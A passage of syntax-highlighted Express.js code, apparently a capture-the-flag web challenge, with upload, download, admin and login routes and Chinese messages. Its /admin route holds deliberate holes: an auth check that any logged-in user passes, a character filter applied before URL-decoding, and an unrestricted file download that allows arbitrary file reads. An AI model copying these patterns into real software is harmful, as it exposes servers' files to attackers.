+</span></span><span class="line"><span class="cl">  <span class="nx">filename</span><span class="o">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cb</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="nx">file</span><span class="o">.</span><span class="nx">originalname</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">upload</span> <span class="o">=</span> <span class="nx">multer</span><span class="p">({</span> <span class="nx">storage</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="no">adminDir</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;media&#39;</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="o">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">adminDir</span><span class="p">))</span> <span class="nx">fs</span><span class="o">.</span><span class="nx">mkdirSync</span><span class="p">(</span><span class="nx">adminDir</span><span class="p">,</span> <span class="p">{</span> <span class="nx">recursive</span><span class="o">:</span> <span class="k">true</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="no">filepathRaw</span> <span class="o">=</span> <span class="nx">String</span><span class="p">(</span><span class="nx">req</span><span class="o">.</span><span class="nx">body</span><span class="o">.</span><span class="nx">filepath</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="no">bc</span> <span class="nx">of</span> <span class="p">[</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">filepathRaw</span><span class="o">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">bc</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;no no no&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">let</span> <span class="nx">filepath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">filepath</span> <span class="o">=</span> <span class="nx">decodeURIComponent</span><span class="p">(</span><span class="nx">filepathRaw</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span><span class="o">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad encoding&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">full</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">filepath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="o">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">full</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">fs</span><span class="o">.</span><span class="nx">statSync</span><span class="p">(</span><span class="nx">full</span><span class="p">)</span><span class="o">.</span><span class="nx">isFile</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span><span class="o">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;file not found&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">download</span><span class="p">(</span><span class="nx">full</span><span class="p">,</span> <span class="nx">path</span><span class="o">.</span><span class="nx">basename</span><span class="p">(</span><span class="nx">full</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span><span class="o">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/download&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="no">user</span> <span class="o">=</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="no">dir</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;media&#39;</span><span class="p">,</span> <span class="nx">user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">let</span> <span class="nx">dirs</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">dirs</span> <span class="o">=</span> <span class="nx">fs</span><span class="o">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">dir</span><span class="p">)</span> <span class="o">?</span> <span class="nx">fs</span><span class="o">.</span><span class="nx">readdirSync</span><span class="p">(</span><span class="nx">dir</span><span class="p">)</span> <span class="o">:</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">dirs</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// render download.ejs with dirs
+</span></span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;download&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">dirs</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="k">null</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/download&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">user</span> <span class="o">=</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">filename</span> <span class="o">=</span> <span class="nx">String</span><span class="p">(</span><span class="nx">req</span><span class="o">.</span><span class="nx">body</span><span class="o">.</span><span class="nx">filename</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">trim</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">userDir</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;media&#39;</span><span class="p">,</span> <span class="nx">user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="c1">// 读取用户目录文件列表（用于渲染页面）
+</span></span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">dirs</span> <span class="o">=</span> <span class="nx">fs</span><span class="o">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">userDir</span><span class="p">)</span> <span class="o">?</span> <span class="nx">fs</span><span class="o">.</span><span class="nx">readdirSync</span><span class="p">(</span><span class="nx">userDir</span><span class="p">)</span> <span class="o">:</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="c1">// 空名处理
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">filename</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;download&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">dirs</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;请选择要下载的文件&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 解析目标绝对路径
+</span></span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="no">target</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">userDir</span><span class="p">,</span> <span class="nx">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="no">rel</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">relative</span><span class="p">(</span><span class="nx">userDir</span><span class="p">,</span> <span class="nx">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="no">inUserDir</span> <span class="o">=</span> <span class="p">(</span><span class="nx">rel</span> <span class="o">===</span> <span class="s1">&#39;&#39;</span> <span class="o">||</span> <span class="p">(</span><span class="o">!</span><span class="nx">rel</span><span class="o">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">path</span><span class="o">.</span><span class="nx">isAbsolute</span><span class="p">(</span><span class="nx">rel</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="no">basename</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">basename</span><span class="p">(</span><span class="nx">target</span><span class="p">)</span><span class="o">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">basename</span><span class="o">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;download&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">dirs</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;该文件禁止下载&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">inUserDir</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;download&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">dirs</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;无法下载该文件（路径非法）&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="o">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">target</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">fs</span><span class="o">.</span><span class="nx">statSync</span><span class="p">(</span><span class="nx">target</span><span class="p">)</span><span class="o">.</span><span class="nx">isFile</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;download&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">dirs</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;无法下载该文件&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">download</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">path</span><span class="o">.</span><span class="nx">basename</span><span class="p">(</span><span class="nx">target</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="o">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;download error:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;download&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">dirs</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;下载失败（服务器错误）&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="o">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/index&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/index&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="no">username</span> <span class="o">=</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="o">.</span><span class="nx">session</span> <span class="o">||</span> <span class="o">!</span><span class="nx">req</span><span class="o">.</span><span class="nx">session</span><span class="o">.</span><span class="nx">username</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;visitor&#39;</span> <span class="o">:</span> <span class="nx">req</span><span class="o">.</span><span class="nx">session</span><span class="o">.</span><span class="nx">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="k">null</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="k">null</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">String</span><span class="p">(</span><span class="nx">req</span><span class="o">.</span><span class="nx">body</span><span class="o">.</span><span class="nx">username</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">let</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">String</span><span class="p">(</span><span class="nx">req</span><span class="o">.</span><span class="nx">body</span><span class="o">.</span><span class="nx">password</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">username</span> <span class="o">=</span> <span class="nx">waf</span><span class="p">(</span><span class="nx">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="nx">in</span> <span class="nx">CACHE</span><span class="o">.</span><span class="nx">users</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;用户已存在 &#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">CACHE</span><span class="o">.</span><span class="nx">users</span><span class="p">[</span><span class="nx">username</span><span class="p">]</span> <span class="o">=</span> <span class="nx">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">dir</span> <span class="o">=</span> <span class="nx">path</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;media&#39;</span><span class="p">,</span> <span class="nx">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="o">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">dir</span><span class="p">))</span> <span class="nx">fs</span><span class="o">.</span><span class="nx">mkdirSync</span><span class="p">(</span><span class="nx">dir</span><span class="p">,</span> <span class="p">{</span> <span class="nx">recursive</span><span class="o">:</span> <span class="k">true</span> <span class="p">});</span>      
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;注册成功，请登录&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="k">null</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="no">username</span> <span class="o">=</span> <span class="nx">String</span><span class="p">(</span><span class="nx">req</span><span class="o">.</span><span class="nx">body</span><span class="o">.</span><span class="nx">username</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="no">password</span> <span class="o">=</span> <span class="nx">String</span><span class="p">(</span><span class="nx">req</span><span class="o">.</span><span class="nx">body</span><span class="o">.</span><span class="nx">password</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="nx">in</span> <span class="nx">CACHE</span><span class="o">.</span><span class="nx">users</span> <span class="o">&amp;&amp;</span> <span class="nx">CACHE</span><span class="o">.</span><span class="nx">users</span><span class="p">[</span><span class="nx">username</span><span class="p">]</span> <span class="o">===</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="o">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">username</span><span class="p">,</span> <span class="p">{</span> <span class="nx">signed</span><span class="o">:</span> <span class="k">true</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="o">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;logged&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">signed</span><span class="o">:</span> <span class="k">true</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;upload&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;登录成功&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;用户名或密码错误&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="o">.</span><span class="nx">session</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">req</span><span class="o">.</span><span class="nx">session</span><span class="o">.</span><span class="nx">destroy</span><span class="p">(</span><span class="nx">err</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span> <span class="nx">res</span><span class="o">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s1">&#39;connect.sid&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span> <span class="nx">res</span><span class="o">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span> <span class="nx">res</span><span class="o">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s1">&#39;logged&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
